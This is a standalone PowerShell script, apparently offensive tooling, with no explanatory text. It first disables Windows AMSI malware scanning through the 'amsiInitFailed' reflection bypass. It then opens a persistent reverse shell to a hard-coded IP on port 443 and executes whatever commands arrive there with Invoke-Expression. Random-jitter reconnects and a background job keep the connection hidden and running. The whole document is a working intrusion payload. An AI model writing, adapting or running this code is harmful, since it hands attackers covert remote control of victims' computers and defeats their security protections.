
$TargetIP = "10.211.55.5"
$TargetPort = "443"
$JitterMax = 5000 
Function Invoke-StealthConnection {
  
Try {
        $a = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
        $f = $a.GetField('amsiInitFailed', 'NonPublic,Static')
        $f.SetValue($null, $true)
    } catch { }

  
While ($true) {
Try {
            $client = New-Object System.Net.Sockets.TCPClient($TargetIP, $TargetPort)
            $stream = $client.GetStream()
            $writer = New-Object System.IO.StreamWriter($stream)
            $reader = New-Object System.IO.StreamReader($stream)
            $writer.AutoFlush = $true
While ($client.Connected) {
                $cmd = $reader.ReadLine()
If ($cmd -eq "exit") { break }
                
              
                $output = Invoke-Expression $cmd 2>&1 | Out-String
                $writer.WriteLine($output + "PS>")
            }
            $client.Close()
        } catch {
          
            $sleepTime = Get-Random -Minimum 1000 -Maximum $JitterMax
            Start-Sleep -Milliseconds $sleepTime
        }
    }
}

# Execute in background thread to keep the host process responsive
$job = Start-Job -ScriptBlock ${function:Invoke-StealthConnection}
